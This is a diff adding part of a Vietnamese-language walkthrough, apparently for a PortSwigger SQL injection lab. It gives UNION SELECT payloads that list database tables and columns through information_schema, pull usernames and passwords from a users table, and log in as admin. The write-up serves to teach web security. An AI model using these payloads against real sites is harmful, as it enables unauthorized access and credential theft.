@@ -14,5 +14,36 @@ Nhưng chúng ta không thể select * để lấy tất cả được vì sẽ 
 
 (https://www.postgresql.org/docs/9.5/infoschema-columns.html)
 
+![](/imgs/SQL-Injection/23.png?raw=true)
+
+Sau khi thực hiện truy vấn **' UNION SELECT table_name,NULL%20 FROM information_schema.tables--**
+
+![](/imgs/SQL-Injection/24.png?raw=true)
+
+Chúng ta sẽ tìm tới bảng users, do sẽ có nhiều bảng user nên thường ngta sẽ đặt tên bảng là số nhiều nên chúng ta chỉ chú ý trước những bảng này để select.
+Ở đây mình sẽ select bảng **users_tucmxy**
+
+Dựa theo [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) lệnh select ra các trường có trong bảng sẽ là
+
+> **SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'**
+
+Áp dụng vào
+> **' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_tucmxy--**
+
+Chúng ta sẽ thu được 2 trường **username_sxdvlv** và **password_pnxobl**
+
+![](/imgs/SQL-Injection/25.png?raw=true)
+
+Chúng ta đã biết được tên các trường và tên bảng, tiến hành select ra data
+> **' UNION SELECT username_sxdvlv,password_pnxobl from users_tucmxy--**
+
+![](/imgs/SQL-Injection/26.png?raw=true)
+
+Login vào tài khoản admin là solve
+
+![](/imgs/SQL-Injection/27.png?raw=true)
+
+
+
 
 
